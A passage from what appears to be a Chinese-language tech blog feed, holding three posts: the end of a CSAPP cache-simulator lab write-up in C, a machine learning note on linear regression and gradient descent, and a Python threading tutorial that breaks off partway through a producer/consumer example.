<p>接下来最关键的是写一个模拟器，模拟cache操作。首先，按照书中的介绍，tag的数量在64位系统下等于64减去块偏移位数量和组索引位数量。根据tag数量，可以求出组索引。接着将这块cache记录到Cache区中。通过循环遍历一块cache块里的行，查看命中情况。</p>
<p>如果命中，更新cache的属性。如果不命中，并且缓存并没满，那么需要添加新的缓存内容。如果因为缓存满了，那么需要将缓存中最先使用的缓存块移除缓存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function">cacheProperty <span class="title">simulate</span><span class="params">(cache currentCache,cacheProperty property, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address)</span></span>&#123;</div><div class="line">    <span class="comment">//compute the size of the tag, 64 bit system</span></div><div class="line">    <span class="keyword">int</span> tagSize = <span class="number">64</span>-(property.b + property.s);</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag = address &gt;&gt; (property.s + property.b);</div><div class="line">    <span class="comment">//use the tagSize to compute for the set index</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> temp = address &lt;&lt; (tagSize);</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> setIndex = temp &gt;&gt; (tagSize + property.b);</div><div class="line">    cacheSet <span class="built_in">set</span> = currentCache.sets[setIndex];</div><div class="line">    <span class="comment">//loop through lines in the set</span></div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> hit = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;property.E; i++)&#123;</div><div class="line">        setLine currentLine = <span class="built_in">set</span>.lines[i];</div><div class="line">        <span class="comment">//check if there is a hit</span></div><div class="line">        <span class="keyword">if</span>(checkHit(currentLine, tag) == <span class="number">1</span>)&#123;</div><div class="line">            <span class="comment">//if hit, update the staffs in the property</span></div><div class="line">            property.hitNum+=<span class="number">1</span>;</div><div class="line">            <span class="keyword">int</span> max = <span class="number">0</span>;</div><div class="line">            hit = <span class="number">1</span>;</div><div class="line">            max = findMax(<span class="built_in">set</span>, property);</div><div class="line">            currentCache.sets[setIndex].lines[i].usedCounter = currentCache.sets[setIndex].lines[max].usedCounter+<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(hit == <span class="number">0</span> &amp;&amp; checkFull(<span class="built_in">set</span>, property) == <span class="number">1</span>)&#123;</div><div class="line">    <span class="comment">//if not full then it is a miss, update the staffs in the property&amp;set</span></div><div class="line">        property.missNum+=<span class="number">1</span>;</div><div class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</div><div class="line">        index = findIndex(<span class="built_in">set</span>, property);</div><div class="line">        <span class="built_in">set</span>.lines[index].tag = tag;</div><div class="line">        <span class="built_in">set</span>.lines[index].valid = <span class="number">1</span>;</div><div class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</div><div class="line">        max = findMax(<span class="built_in">set</span>, property);</div><div class="line">        currentCache.sets[setIndex].lines[index].usedCounter = currentCache.sets[setIndex].lines[max].usedCounter+<span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(hit == <span class="number">0</span>)&#123;</div><div class="line">        <span class="comment">//evict, update the staffs in the property&amp;set</span></div><div class="line">        property.missNum+=<span class="number">1</span>;</div><div class="line">        property.evictionNum+=<span class="number">1</span>;</div><div class="line">        <span class="keyword">int</span> evictIndex = <span class="number">0</span>;</div><div class="line">        <span class="comment">//find the evict line</span></div><div class="line">        evictIndex = findEvict(<span class="built_in">set</span>, property);</div><div class="line">        <span class="built_in">set</span>.lines[evictIndex].tag = tag;</div><div class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</div><div class="line">        max = findMax(<span class="built_in">set</span>, property);</div><div class="line">        currentCache.sets[setIndex].lines[evictIndex].usedCounter = currentCache.sets[setIndex].lines[max].usedCounter+<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> property;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然最后需要些一个主函数来调用测试接口。这里关于trace文件。每一条对内存访问的记录格式是 [空格]操作符 地址,大小，以 I 开头的是载入指令的记录，不算在内存访问中。</p>
<ul>
<li>M 表示数据修改，需要一次载入 + 一次存储，也就是相当于两次访问</li>
<li>S 表示数据存储</li>
<li>L 表示数据载入</li>
<li>地址指的是一个 64 位的 16 进制内存地址</li>
<li>大小表示该操作内存访问的字节数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></div><div class="line">&#123;</div><div class="line">    cache currentCache;</div><div class="line">    cacheProperty property;</div><div class="line">    <span class="comment">//initiate the char to store the trace</span></div><div class="line">    <span class="keyword">char</span>* trace;</div><div class="line">    <span class="keyword">char</span> input;</div><div class="line">    property.verbosity = <span class="number">0</span>;</div><div class="line">    <span class="comment">//parse input</span></div><div class="line">    <span class="keyword">while</span>( (input=getopt(argc,argv,<span class="string">"s:E:b:t:vh"</span>)) != <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">switch</span>(input)&#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'s'</span>:</div><div class="line">            property.s = atoi(optarg);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">            property.E = atoi(optarg);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">            property.b = atoi(optarg);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'t'</span>:</div><div class="line">            trace = optarg;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:</div><div class="line">            property.verbosity = <span class="number">1</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="comment">//help</span></div><div class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:</div><div class="line">            printUsage();</div><div class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            printUsage();</div><div class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//compute S and B</span></div><div class="line">    property.S = <span class="built_in">pow</span>(<span class="number">2.0</span>,property.s);</div><div class="line">    property.B = <span class="built_in">pow</span>(<span class="number">2.0</span>,property.b);</div><div class="line">    <span class="comment">//initialize the cache</span></div><div class="line">    currentCache = initiate(property.S, property.E);</div><div class="line">    <span class="comment">//initialize the counters</span></div><div class="line">    property.missNum = <span class="number">0</span>;</div><div class="line">    property.hitNum = <span class="number">0</span>;</div><div class="line">    property.evictionNum = <span class="number">0</span>;</div><div class="line">    <span class="comment">//input file</span></div><div class="line">    FILE *tmp;</div><div class="line">    <span class="comment">//wrap the trace into tmp</span></div><div class="line">    <span class="keyword">char</span> command;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address;</div><div class="line">    <span class="keyword">int</span> size;</div><div class="line">    tmp = fopen(trace, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(tmp, <span class="string">" %c %llx,%d"</span>, &amp;command, &amp;address, &amp;size) == <span class="number">3</span>)&#123;</div><div class="line">        <span class="keyword">switch</span>(command)&#123;</div><div class="line">            <span class="comment">//just ignore I</span></div><div class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</div><div class="line">                property = simulate(currentCache, property, address);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</div><div class="line">                property = simulate(currentCache, property, address);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="comment">//twice for M</span></div><div class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</div><div class="line">                property = simulate(currentCache, property, address);</div><div class="line">                property = simulate(currentCache, property, address);	</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//print result</span></div><div class="line">    printSummary(property.hitNum, property.missNum, property.evictionNum);</div><div class="line">    fclose(tmp);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>先总结Part A部分。虽然并没有完全动手写这个代码，仅仅是参考分析他人的代码(主要是没看懂trace文件和不知道怎么调用接口)，但对于cache的操作，通过上面分析源码的含义并参考书中的知识，大致有了比较深刻的理解。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning Note 1</title>
    <link href="http://xinqiu.me/2016/06/02/ml-1/"/>
    <id>http://xinqiu.me/2016/06/02/ml-1/</id>
    <published>2016-06-01T16:00:00.000Z</published>
    <updated>2016-06-04T06:43:49.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<blockquote>
<p>Coursera 上的Machine Learning 算得上是经典的机器学习入门课程，是由Andrew Ng大牛上的课。出于对机器学习的好奇，打算用Python来完成这门课的学习。</p>
</blockquote>
<h2 id="Supervised_learning__u76D1_u7763_u5B66_u4E60"><a href="#Supervised_learning__u76D1_u7763_u5B66_u4E60" class="headerlink" title="Supervised learning 监督学习"></a>Supervised learning 监督学习</h2><p>这里存在两种问题 <strong>regression</strong> 和 <strong>classification</strong>。前者是预测相关的问题，后者是分类相关的问题。</p>
<p>首先介绍的是监督学习，notes1中用房屋价格预测来介绍Linear Regression线性回归。这里因为没有数据集，所以我选择用ex<br>1中的<code>ex1data1.txt</code>来做演示。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line">data = np.loadtxt(<span class="string">'ex1data1.txt'</span>, delimiter=<span class="string">','</span>)</div><div class="line">m = data.shape[<span class="number">0</span>]</div><div class="line">X = data[:,<span class="number">0</span>]</div><div class="line">y = data[:, <span class="number">1</span>]</div><div class="line">plt.scatter(X, y, c=<span class="string">'r'</span>, marker=<span class="string">'x'</span>, linewidths=<span class="number">1</span>)</div><div class="line">plt.xlim([<span class="number">3</span>, max(X)+<span class="number">3</span>])</div><div class="line">plt.ylabel(<span class="string">'Profit in $10,000s'</span>)</div><div class="line">plt.xlabel(<span class="string">'Population of City in 10,000s'</span>)</div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p>可以画出数据分布散点图。</p>
<a id="more"></a>
<p><img src="1.png" alt=""></p>
<p>机器学习的流程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">          +------------------+</div><div class="line">          |                  |</div><div class="line">          |     Training     |</div><div class="line">          |       set        |</div><div class="line">          |                  |</div><div class="line">          +------------------+</div><div class="line">                   ||</div><div class="line">                   ||</div><div class="line">          +--------\/--------+</div><div class="line">          |                  |</div><div class="line">          |     Learning     |</div><div class="line">          |     algorithm    |</div><div class="line">          |                  |</div><div class="line">          +------------------+</div><div class="line">                   ||</div><div class="line">                   ||</div><div class="line">          +--------\/--------+</div><div class="line">          |                  |</div><div class="line">          |    hypothesis    |</div><div class="line">X +-------&gt;                  +-------&gt;  Y</div><div class="line">          |                  |</div><div class="line">          +------------------+</div></pre></td></tr></table></figure>
<p>用大量的训练数据带入学习算法中进行学习，学习算法产生假设模型，通过假设模型，可以由未知数据X得出需要的Y。</p>
<h3 id="Linear_Regression__u7EBF_u6027_u56DE_u5F52"><a href="#Linear_Regression__u7EBF_u6027_u56DE_u5F52" class="headerlink" title="Linear Regression 线性回归"></a>Linear Regression 线性回归</h3><p>根据 <code>ex1data2.txt</code> 里的数据，因为有两个特征，所以可以写出假设模型</p>
<p>$$ h_{\theta } = \theta_{0}+ \theta_{1}x_{1}+\theta_{2}x_{2}$$</p>
<p>其中 $\theta_{i}$ 是线性方程的确定性参数(有点类似权重的东西？)。所以，假设 $ x_{0} = 1$, 从广义上可以定义假设方程</p>
<p>$$h_{\theta } =\sum_{n}^{i=0}\theta_{i}x_{i}=\theta^{T}x$$</p>
<p>其中 $\theta$ 和 $x$ 都是向量，$n$ 是输入变量的个数。</p>
<p>确定完假设模型，之后需要做的一件事是挑选学习 $\theta$。一个可靠的方法可以让 $h(x)$ 接近 $y$。为了评估假设模型与数据集的接近程度，定义了一个 <strong>cost function</strong>（代价函数）</p>
<p>$$ J(\theta )=\frac{1}{2}\sum_{m}^{i=1}(h_{\theta}(x^{(i)})-y^{(i)})^{2} $$</p>
<p>这是least-squares cost function，是 <strong>ordinary least squares regression model</strong> 的一部分。</p>
<h4 id="LMS_algorithm"><a href="#LMS_algorithm" class="headerlink" title="LMS algorithm"></a>LMS algorithm</h4><p>为了寻找合适的 $\theta$ 使 $J(\theta )$ 最小，可以使用LMS算法通过不断的改变 $\theta$ 来寻找合适的值。这里使用了 <strong>gradient descent algorithm</strong>(梯度递减算法)，更新 $\theta$ 的方式如下</p>
<p>$$ \theta_{j} := \theta_{j} -\alpha \frac{\partial }{\partial \theta_{j}}J(\theta) $$</p>
<p>其中，$\alpha$ 是 <strong>learning rate</strong>（学习率）, $\frac{\partial }{\partial \theta_{j}}J(\theta)$ 可以化简为<br>$$ \frac{\partial }{\partial \theta_{j}}J(\theta) = (h_{\theta}(x)-y)x_{j} $$</p>
<p>这样的更新规则称为LMS update rule(least mean squares),也称为Widrow-Hoﬀ learning rule.</p>
<p>$$  \theta_{j} := \theta_{j} + \alpha  (y^{(i)} -h_{\theta}(x^{(i)}))x_{j}^{(i)}$$</p>
<p>梯度递减这里提到了两种 <strong>batch gradient descent</strong> (批量梯度递减) 和 <strong>stochastic gradient descent</strong> (随机梯度递减)。</p>
<h4 id="The_normal_equations"><a href="#The_normal_equations" class="headerlink" title="The normal equations"></a>The normal equations</h4><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a href="http://cs229.stanford.edu/notes/cs229-notes1.ps" target="_blank" rel="external">CS229 notes1</a></p>
</li>
<li><p><a href="https://www.coursera.org/learn/machine-learning" target="_blank" rel="external">Coursera Machine Learning</a></p>
</li>
<li><p><a href="http://blog.csdn.net/lilyth_lilyth/article/details/8973972" target="_blank" rel="external">随机梯度下降（Stochastic gradient descent）和 批量梯度下降（Batch gradient descent ）的公式对比、实现对比</a></p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      机器学习笔记
    
    </summary>
    
    
      <category term="machine-learning" scheme="http://xinqiu.me/tags/machine-learning/"/>
    
  </entry>
  
  <entry>
    <title>Python线程学习</title>
    <link href="http://xinqiu.me/2016/05/10/python-thread/"/>
    <id>http://xinqiu.me/2016/05/10/python-thread/</id>
    <published>2016-05-09T16:00:00.000Z</published>
    <updated>2016-11-27T02:00:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>Python2.7中有两个常用的多线程库Multiprocessing，Threading。在Python中，线程和进程的区别在于线程模块使用线程，进程模块使用进程233，不开玩笑，这是StackOverFlow上的解释。说重点，线程使用相同的内存空间，而进程使用不同的。这也就让进程之间传对象稍有点困难。当然，由于线程共享内存空间，那么必须要考虑线程安全。</p>
<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><p>thread算是轻量级的线程模块，它提供较为底层的多线程实现方案。使用start_new_thread(function, args[, kwargs])实现线程。使用allocate_lock()可以得到一个锁对象，用acquire()和release()来加锁和释放锁，用locked()来判断释放有锁。一把锁只能被一个线程得到，所以利用锁可以避免多个线程对同一资源的同时操作。</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> thread</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLock</span><span class="params">(lock)</span>:</span></div><div class="line">    lock.acquire() <span class="comment"># 获得锁</span></div><div class="line">    <span class="keyword">print</span> lock.locked() <span class="comment"># 判断是否有锁</span></div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    lock.release() <span class="comment"># 释放锁</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    lock = thread.allocate() <span class="comment"># 分配一个锁对象</span></div><div class="line">    thread.start_new(addLock,(lock,)) <span class="comment"># 开辟一个线程</span></div><div class="line">    thread.start_new(addLock,(lock,))</div><div class="line">    sleep(<span class="number">3</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h2><p>threading作为一个更高级的模块，提供了一些thread没有的功能。threading中有两种锁，如threading.Lock()， threading.RLock()。</p>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p>这里lock和thread模块里类似。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLock</span><span class="params">(lock)</span>:</span></div><div class="line">    <span class="keyword">print</span> lock.acquire(<span class="keyword">False</span>)</div><div class="line">    <span class="comment"># lock.release()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    lock = threading.Lock()</div><div class="line">    t1 = threading.Thread(target=addLock, args=(lock,))</div><div class="line">    t2 = threading.Thread(target=addLock, args=(lock,))</div><div class="line">    t1.run()</div><div class="line">    t2.run()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>以上代码演示了利用Threading模块来确定一把锁只能被获得一次。</p>
<h3 id="RLock"><a href="#RLock" class="headerlink" title="RLock"></a>RLock</h3><p>RLock是可重入锁（reentrant lock），acquire()能够不被阻塞的被同一个线程调用多次。要注意的是release()需要调用与acquire()相同的次数才能释放锁。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading,time</div><div class="line"></div><div class="line">rlock=threading.RLock()</div><div class="line">result=[]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step1</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> result</div><div class="line">    <span class="keyword">if</span> rlock.acquire():</div><div class="line">        result.append(<span class="string">'step1'</span>)</div><div class="line">        time.sleep(<span class="number">0</span>)</div><div class="line">        rlock.release()</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step2</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> result</div><div class="line">    <span class="keyword">if</span> rlock.acquire():</div><div class="line">        result.append(<span class="string">'step2'</span>)</div><div class="line">        time.sleep(<span class="number">0</span>)</div><div class="line">        rlock.release()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">showresult</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> threading.current_thread() <span class="comment"># 查看当前线程</span></div><div class="line">    <span class="keyword">if</span> rlock.acquire():</div><div class="line">        step1()</div><div class="line">        step2()</div><div class="line">        rlock.release()</div><div class="line">    <span class="keyword">print</span> result</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clearresult</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> result</div><div class="line">    <span class="keyword">if</span> rlock.acquire():</div><div class="line">        result=<span class="keyword">None</span></div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        rlock.release()</div><div class="line">    <span class="keyword">print</span> threading.current_thread()</div><div class="line">    <span class="keyword">print</span> result</div><div class="line"></div><div class="line">t1=threading.Thread(target=showresult)</div><div class="line">t2=threading.Thread(target=clearresult)</div><div class="line"></div><div class="line">t1.start()</div><div class="line">t2.start()</div></pre></td></tr></table></figure>
<h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><p>条件同步机制是指：一个线程等待特定条件，而另一个线程发出特定条件满足的信号。 解释条件同步机制的一个很好的例子就是生产者/消费者（producer/consumer）模型。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/condition.png" alt=""></p>
<h3 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h3><p>信号量同步基于内部计数器，每调用一次acquire()，计数器减1；每调用一次release()，计数器加1.当计数器为0时，acquire()调用被阻塞。</p>
<h3 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h3><p>基于事件的同步是指：一个线程发送/传递事件，另外的线程等待事件的触发。在set()时， 其他线程就被唤醒执行。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/event.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> threading, time</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Producer</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line">  向列表中生产随机整数</div><div class="line">  """</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, integers, event)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    构造器</div><div class="line"></div><div class="line">    @param integers 整数列表</div><div class="line">    @param event 事件同步对象</div><div class="line">    """</div><div class="line">    threading.Thread.__init__(self)</div><div class="line">    self.integers = integers</div><div class="line">    self.event = event</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    实现Thread的run方法。在随机时间向列表中添加一个随机整数</div><div class="line">    """</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">      integer = random.randint(<span class="number">0</span>, <span class="number">256</span>)</div><div class="line">      self.integers.append(integer)</div><div class="line">      <span class="keyword">print</span> <span class="string">'%d appended to list by %s'</span> % (integer, self.name)</div><div class="line">      <span class="keyword">print</span> <span class="string">'event set by %s'</span> % self.name</div><div class="line">      self.event.set()		<span class="comment">#设置事件</span></div><div class="line">      self.event.clear()	<span class="comment">#发送事件</span></div><div class="line">      <span class="keyword">print</span> <span class="string">'event cleared by %s'</span> % self.name</div><div class="line">      time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line">   从列表中消费整数</div><div class="line">  """</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, integers, event)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    构造器</div><div class="line"></div><div class="line">    @param integers 整数列表</div><div class="line">    @param event 事件同步对象</div><div class="line">    """</div><div class="line">    threading.Thread.__init__(self)</div><div 